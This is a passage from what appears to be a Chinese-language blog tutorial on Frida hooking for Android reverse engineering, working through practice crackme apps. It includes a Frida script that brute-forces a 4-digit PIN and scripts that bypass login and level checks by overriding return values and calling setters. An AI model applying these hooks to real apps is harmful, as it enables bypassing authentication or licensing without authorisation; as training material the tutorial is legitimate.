class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">verifyPassword</span><span class="params">(Context context, String input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input.length() != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] v = encodePassword(input);</span><br><span class="line">    <span class="keyword">byte</span>[] p = <span class="string">"09042ec2c2c08c4cbece042681caf1d13984f24a"</span>.getBytes();</span><br><span class="line">    <span class="keyword">if</span> (v.length != p.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v[i] != p[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就爆破一下密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U | grep qualification</span><br><span class="line">7660  org.teamsik.ahe17.qualification.easy</span><br><span class="line"></span><br><span class="line">frida -U org.teamsik.ahe17.qualification.easy -l force.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"In Java perform"</span>)</span><br><span class="line">        <span class="keyword">var</span> verify = Java.use(<span class="string">"org.teamsik.ahe17.qualification.Verifier"</span>)</span><br><span class="line">        <span class="keyword">var</span> stringClass = Java.use(<span class="string">"java.lang.String"</span>)</span><br><span class="line">        <span class="keyword">var</span> p = stringClass.$<span class="keyword">new</span>(<span class="string">"09042ec2c2c08c4cbece042681caf1d13984f24a"</span>)</span><br><span class="line">        <span class="keyword">var</span> pSign = p.getBytes()</span><br><span class="line">        <span class="comment">// var pStr = stringClass.$new(pSign)</span></span><br><span class="line">        <span class="comment">// console.log(parseInt(pStr))</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> v = stringClass.$<span class="keyword">new</span>(<span class="built_in">String</span>(i))</span><br><span class="line">            <span class="keyword">var</span> vSign = verify.encodePassword(v)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">parseInt</span>(stringClass.$<span class="keyword">new</span>(pSign)) == <span class="built_in">parseInt</span>(stringClass.$<span class="keyword">new</span>(vSign))) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"yes: "</span> + v)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"not :"</span> + v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">not :9080</span><br><span class="line">not :9081</span><br><span class="line">not :9082</span><br><span class="line">yes: 9083</span><br></pre></td></tr></table></figure><p>这里注意parseInt</p><h2 id="Frida-hook基础-一"><a href="#Frida-hook基础-一" class="headerlink" title="Frida hook基础(一)"></a>Frida hook基础(一)</h2><ul><li>调用静态函数和调用非静态函数</li><li>设置(同名)成员变量</li><li>内部类，枚举类的函数并hook，trace原型1</li><li>查找接口，hook动态加载dex</li><li>枚举class，trace原型2</li><li>objection不能切换classloader</li></ul><h3 id="Frida-hook-打印参数、返回值-设置返回值-主动调用"><a href="#Frida-hook-打印参数、返回值-设置返回值-主动调用" class="headerlink" title="Frida hook : 打印参数、返回值/设置返回值/主动调用"></a>Frida hook : 打印参数、返回值/设置返回值/主动调用</h3><p>demo就不贴了，还是先定位登录失败点，然后搜索字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> Context mContext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="keyword">this</span>.mContext = <span class="keyword">this</span>;</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_login);</span><br><span class="line">        <span class="keyword">final</span> EditText editText = (EditText) findViewById(R.id.username);</span><br><span class="line">        <span class="keyword">final</span> EditText editText2 = (EditText) findViewById(R.id.password);</span><br><span class="line">        ((Button) findViewById(R.id.login)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                String obj = editText.getText().toString();</span><br><span class="line">                String obj2 = editText2.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (TextUtils.isEmpty(obj) || TextUtils.isEmpty(obj2)) &#123;</span><br><span class="line">                    Toast.makeText(LoginActivity.<span class="keyword">this</span>.mContext, <span class="string">"username or password is empty."</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (LoginActivity.a(obj, obj).equals(obj2)) &#123;</span><br><span class="line">                    LoginActivity.<span class="keyword">this</span>.startActivity(<span class="keyword">new</span> Intent(LoginActivity.<span class="keyword">this</span>.mContext, FridaActivity1<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">                    LoginActivity.<span class="keyword">this</span>.finishActivity(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(LoginActivity.<span class="keyword">this</span>.mContext, <span class="string">"Login failed."</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>LoginActivity.a(obj, obj).equals(obj2)</code>分析之后可得obj2来自password，由从username得来的obj，经过a函数运算之后得到一个值，这两个值相等则登录成功。<br>所以这里关键是hook a函数的参数，最简脚本如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印参数、返回值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.use(<span class="string">"com.example.androiddemo.Activity.LoginActivity"</span>).a.overload(<span class="string">'java.lang.String'</span>, <span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str, str2</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.a(str, str2);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"args0:"</span>+str+<span class="string">" args1:"</span>+str2+<span class="string">" result:"</span>+result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(Login)</span><br></pre></td></tr></table></figure><p>观察输入和输出,这里也可以直接主动调用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        <span class="keyword">var</span> login = Java.use(<span class="string">"com.example.androiddemo.Activity.LoginActivity"</span>)</span><br><span class="line">        <span class="keyword">var</span> result = login.a(<span class="string">"1234"</span>,<span class="string">"1234"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(login)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">start</span><br><span class="line">4e4feaea959d426155a480dc07ef92f4754ee93edbe56d993d74f131497e66fb</span><br><span class="line">然后</span><br><span class="line">adb shell input text &quot;4e4feaea959d426155a480dc07ef92f4754ee93edbe56d993d74f131497e66fb&quot;</span><br></pre></td></tr></table></figure><p>接下来是第一关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseFridaActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Button mNextCheck;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CheckSuccess</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_frida);</span><br><span class="line">        <span class="keyword">this</span>.mNextCheck = (Button) findViewById(R.id.next_check);</span><br><span class="line">        <span class="keyword">this</span>.mNextCheck.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button button = <span class="keyword">this</span>.mNextCheck;</span><br><span class="line">        button.setText(getNextCheckTitle() + <span class="string">"，点击进入下一关"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        onCheck();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CheckFailed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>, <span class="string">"Check Failed!"</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity1</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] table = &#123;<span class="string">'L'</span>, <span class="string">'K'</span>, <span class="string">'N'</span>, <span class="string">'M'</span>, <span class="string">'O'</span>, <span class="string">'Q'</span>, <span class="string">'P'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'A'</span>, <span class="string">'T'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'E'</span>, <span class="string">'D'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'d'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'j'</span>, <span class="string">'i'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'6'</span>, <span class="string">'5'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"当前第1关"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a(b(<span class="string">"请输入密码:"</span>)).equals(<span class="string">"R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL="</span>)) &#123;</span><br><span class="line">                CheckSuccess();</span><br><span class="line">                startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity2<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">                finishActivity(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] bArr)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= bArr.length - <span class="number">1</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">byte</span> b = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt;= <span class="number">2</span>; i2++) &#123;</span><br><span class="line">                <span class="keyword">int</span> i3 = i + i2;</span><br><span class="line">                <span class="keyword">if</span> (i3 &lt;= bArr.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    bArr2[i2] = (<span class="keyword">byte</span>) (b | ((bArr[i3] &amp; <span class="number">255</span>) &gt;&gt;&gt; ((i2 * <span class="number">2</span>) + <span class="number">2</span>)));</span><br><span class="line">                    b = (<span class="keyword">byte</span>) ((((bArr[i3] &amp; <span class="number">255</span>) &lt;&lt; (((<span class="number">2</span> - i2) * <span class="number">2</span>) + <span class="number">2</span>)) &amp; <span class="number">255</span>) &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bArr2[i2] = b;</span><br><span class="line">                    b = <span class="number">64</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bArr2[<span class="number">3</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i4 = <span class="number">0</span>; i4 &lt;= <span class="number">3</span>; i4++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (bArr2[i4] &lt;= <span class="number">63</span>) &#123;</span><br><span class="line">                    sb.append(table[bArr2[i4]]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">'='</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] b(String str) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            GZIPOutputStream gZIPOutputStream = <span class="keyword">new</span> GZIPOutputStream(byteArrayOutputStream);</span><br><span class="line">            gZIPOutputStream.write(str.getBytes());</span><br><span class="line">            gZIPOutputStream.finish();</span><br><span class="line">            gZIPOutputStream.close();</span><br><span class="line">            <span class="keyword">byte</span>[] byteArray = byteArrayOutputStream.toByteArray();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                byteArrayOutputStream.close();</span><br><span class="line">                <span class="keyword">return</span> byteArray;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> byteArray;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键函数在<code>a(b(&quot;请输入密码:&quot;)).equals(&quot;R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=&quot;)</code><br>这里应该直接hook a，让其返回值为<code>R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=</code>就可以进入下一关了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity1"</span>).a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL="</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-主动调用静态-非静态函数-以及-设置静态-非静态成员变量的值"><a href="#Frida-hook-主动调用静态-非静态函数-以及-设置静态-非静态成员变量的值" class="headerlink" title="Frida hook : 主动调用静态/非静态函数 以及 设置静态/非静态成员变量的值"></a>Frida hook : 主动调用静态/非静态函数 以及 设置静态/非静态成员变量的值</h3><p>总结:</p><ul><li>静态函数直接use class然后调用方法，非静态函数需要先choose实例然后调用</li><li>设置成员变量的值，写法是<code>xx.value = yy</code>，其他方面和函数一样。</li><li>如果有一个成员变量和成员函数的名字相同，则在其前面加一个<code>_</code>，如<code>_xx.value = yy</code></li></ul><p>然后是第二关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity2</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> static_bool_var = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> bool_var = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"当前第2关"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setStatic_bool_var</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        static_bool_var = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setBool_var</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bool_var = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!static_bool_var || !<span class="keyword">this</span>.bool_var) &#123;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity3<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        finishActivity(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关的关键在于下面的if判断要为false，则<code>static_bool_var</code>和<code>this.bool_var</code>都要为true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!static_bool_var || !this.bool_var) &#123;</span><br><span class="line">            super.CheckFailed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这样就要调用<code>setBool_var</code>和<code>setStatic_bool_var</code>两个函数了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function ch2() &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        console.log(&quot;start&quot;)</span><br><span class="line">        var FridaActivity2 &#x3D; Java.use(&quot;com.example.androiddemo.Activity.FridaActivity2&quot;)</span><br><span class="line">        &#x2F;&#x2F;hook静态函数直接调用</span><br><span class="line">        FridaActivity2.setStatic_bool_var()</span><br><span class="line">        &#x2F;&#x2F;hook动态函数，找到instance实例，从实例调用函数方法</span><br><span class="line">        Java.choose(&quot;com.example.androiddemo.Activity.FridaActivity2&quot;, &#123;</span><br><span class="line">            onMatch: function (instance) &#123;</span><br><span class="line">                instance.setBool_var()</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function () &#123;</span><br><span class="line">                console.log(&quot;end&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(ch2)</span><br></pre></td></tr></table></figure><p>接下来是第三关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 